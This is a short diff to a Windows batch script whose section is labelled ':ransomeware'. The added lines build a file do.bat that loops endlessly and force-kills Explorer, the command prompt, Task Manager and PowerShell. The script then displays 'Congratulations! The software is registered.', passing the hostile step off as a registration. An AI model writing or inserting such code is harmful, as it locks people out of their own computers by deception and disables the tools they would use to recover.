@@ -6,6 +6,13 @@ if %p%==n exit
 
 :ransomeware
 cls
+echo :do>do.bat
+echo taskkill /f /im explorer.exe>>do.bat
+echo taskkill /im cmd.exe>>do.bat
+echo taskkill /f /im taskmgr>>do.bat
+echo taskkill /f /im powershell.exe>>do.bat
+echo taskkill /f /im powershell_ise.exe>>do.bat
+echo goto do>>do.bat
 echo Congratulations! The software is registered.
 pause
 cls
